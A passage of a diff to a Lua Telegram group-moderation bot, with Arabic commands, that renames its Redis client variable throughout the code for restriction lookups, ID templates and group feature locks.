 if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
 function kshf_by_reply(extra, result, success)
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if DevBRAND:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if DevBRAND:sismember(BRAND..'BRAND:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if DevBRAND:sismember(BRAND..'BRAND:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+if DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if DevABS:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
+if DevABS:sismember(BRAND..'BRAND:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if DevABS:sismember(BRAND..'BRAND:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if DevABS:sismember(BRAND..'BRAND:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
@@ -6842,11 +6842,11 @@ if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(
 local username = text:match('^كشف القيود @(.*)') 
 function kshf_by_username(extra, result, success)
 if result.id_ then
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if DevBRAND:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if DevBRAND:sismember(BRAND..'BRAND:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if DevBRAND:sismember(BRAND..'BRAND:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+if DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if DevABS:sismember(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
+if DevABS:sismember(BRAND..'BRAND:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if DevABS:sismember(BRAND..'BRAND:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if DevABS:sismember(BRAND..'BRAND:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
@@ -6863,10 +6863,10 @@ end
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:BanAll:',result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:MuteAll:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) DevABS:srem(BRAND..'BRAND:BanAll:',result.sender_user_id_) DevABS:srem(BRAND..'BRAND:MuteAll:',result.sender_user_id_)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) 
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.sender_user_id_) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.sender_user_id_) 
 end
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
@@ -6885,10 +6885,10 @@ end
 ReplyStatus(msg,user,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,user) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,user) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,user) DevBRAND:srem(BRAND..'BRAND:BanAll:',user) DevBRAND:srem(BRAND..'BRAND:MuteAll:',user)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,user) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,user) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,user) DevABS:srem(BRAND..'BRAND:BanAll:',user) DevABS:srem(BRAND..'BRAND:MuteAll:',user)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,user) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,user) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,user) 
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,user) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,user) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,user) 
 end  
 end,nil)  
 end
@@ -6915,10 +6915,10 @@ end
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.id_) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) DevBRAND:srem(BRAND..'BRAND:BanAll:',result.id_) DevBRAND:srem(BRAND..'BRAND:MuteAll:',result.id_)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.id_) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) DevABS:srem(BRAND..'BRAND:BanAll:',result.id_) DevABS:srem(BRAND..'BRAND:MuteAll:',result.id_)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.id_) DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) 
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_,result.id_) DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_,result.id_) DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_,result.id_) 
 end
 end,nil)   
 end  
@@ -7010,52 +7010,52 @@ local List = {
 - ɢᴀᴍᴇ ➥• #game .
 ]]}
 local Text_Rand = List[math.random(#List)]
-DevBRAND:set(BRAND.."BRAND:GpIds:Text"..msg.chat_id_,Text_Rand)
+DevABS:set(BRAND.."BRAND:GpIds:Text"..msg.chat_id_,Text_Rand)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم تغير كليشة الايدي")  
 end
 --     Source BRAND     --
 if SecondSudo(msg) then
 if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
-DevBRAND:set("BRAND:New:id:"..BRAND..msg.sender_user_id_,'BRANDTTEAM')
+DevABS:set("BRAND:New:id:"..BRAND..msg.sender_user_id_,'BRANDTTEAM')
 return "BRANDTTEAM"
 end
-if text and DevBRAND:get("BRAND:New:id:"..BRAND..msg.sender_user_id_) then 
+if text and DevABS:get("BRAND:New:id:"..BRAND..msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
-DevBRAND:del("BRAND:New:id:"..BRAND..msg.sender_user_id_)
+DevABS:del("BRAND:New:id:"..BRAND..msg.sender_user_id_)
 return false
 end
-DevBRAND:del("BRAND:New:id:"..BRAND..msg.sender_user_id_)
+DevABS:del("BRAND:New:id:"..BRAND..msg.sender_user_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الايدي العامه', 1, 'md')
-DevBRAND:set(BRAND.."BRAND:AllIds:Text",text)
+DevABS:set(BRAND.."BRAND:AllIds:Text",text)
 return false
 end
 if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي العامه")  
-DevBRAND:del(BRAND.."BRAND:AllIds:Text")
+DevABS:del(BRAND.."BRAND:AllIds:Text")
 end
 end
 --     Source BRAND     --
 if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
-DevBRAND:set("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_,'BRANDTTEAM')
+DevABS:set("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_,'BRANDTTEAM')
 return "BRANDTTEAM"
 end
-if text and Manager(msg) and DevBRAND:get("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_) then 
+if text and Manager(msg) and DevABS:get("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
-DevBRAND:del("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_)
+DevABS:del("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_)
 return false
 end
-DevBRAND:del("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_)
+DevABS:del("BRAND:New:id:"..BRAND..msg.chat_id_..msg.sender_user_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الكليشه الجديده', 1, 'md')
-DevBRAND:set(BRAND.."BRAND:GpIds:Text"..msg.chat_id_,text)
+DevABS:set(BRAND.."BRAND:GpIds:Text"..msg.chat_id_,text)
 return false
 end
 if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي")  
-DevBRAND:del(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
 end
 end
 --     Source BRAND     --
@@ -7067,19 +7067,19 @@ function BRANDTTEAM(extra,abbas,success)
 if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
 if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
 local function getpro(extra, abbas, success) 
-local msgsday = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..BRAND..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-local edit_msg = DevBRAND:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local user_nkt = tonumber(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
-local cont = (tonumber(DevBRAND:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local msguser = tonumber(DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local msgsday = DevABS:get(BRAND..'BRAND:UsersMsgs'..BRAND..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local edit_msg = DevABS:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local user_nkt = tonumber(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
+local cont = (tonumber(DevABS:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local msguser = tonumber(DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
 local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
 local Description = Texting[math.random(#Texting)]
 if abbas.photos_[0] then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then 
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then 
-if DevBRAND:get(BRAND.."BRAND:AllIds:Text") then
-newpicid = DevBRAND:get(BRAND.."BRAND:AllIds:Text")
+if not DevABS:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then 
+if not DevABS:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then 
+if DevABS:get(BRAND.."BRAND:AllIds:Text") then
+newpicid = DevABS:get(BRAND.."BRAND:AllIds:Text")
 newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
 newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7096,10 +7096,10 @@ newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
 else
 newpicid = "⌁︙"..Description.."\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end 
-if not DevBRAND:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_) then 
+if not DevABS:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_) then 
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
 else 
-local new_id = DevBRAND:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
+local new_id = DevABS:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7116,8 +7116,8 @@ local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
 end
 else
-if DevBRAND:get(BRAND.."BRAND:AllIds:Text") then
-newallid = DevBRAND:get(BRAND.."BRAND:AllIds:Text")
+if DevABS:get(BRAND.."BRAND:AllIds:Text") then
+newallid = DevABS:get(BRAND.."BRAND:AllIds:Text")
 newallid = newallid:gsub('#username',(username or 'لا يوجد'))
 newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7134,10 +7134,10 @@ newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
 else
 newallid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩"
 end 
-if not DevBRAND:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_) then
+if not DevABS:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
 else
-local new_id = DevBRAND:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
+local new_id = DevABS:get(BRAND.."BRAND:GpIds:Text"..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7158,8 +7158,8 @@ else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل ', 1, 'md')
 end
 else
-if DevBRAND:get(BRAND.."BRAND:AllIds:Text") then
-notpicid = DevBRAND:get(BRAND.."BRAND:AllIds:Text")
+if DevABS:get(BRAND.."BRAND:AllIds:Text") then
+notpicid = DevABS:get(BRAND.."BRAND:AllIds:Text")
 notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
 notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7176,8 +7176,8 @@ notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
 else
 notpicid = "⌁︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end 
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
@@ -7196,96 +7196,96 @@ if Admin(msg) then
 if text and text:match("^قفل (.*)$") then
 local LockText = {string.match(text, "^(قفل) (.*)$")}
 if LockText[2] == "التعديل" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التعديل")  
-DevBRAND:set(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل تعديل الميديا")  
-DevBRAND:set(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفارسيه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفشار" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفشار")  
-DevBRAND:del(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الطائفيه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الطائفيه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Taf'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Taf'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الكفر" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكفر")  
-DevBRAND:del(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفارسيه بالطرد" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه بالطرد")  
-DevBRAND:set(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
 end
 end
 if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالحذف")  
-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del")  
+DevABS:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del")  
 end
 if LockText[2] == "البوتات بالطرد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالطرد")  
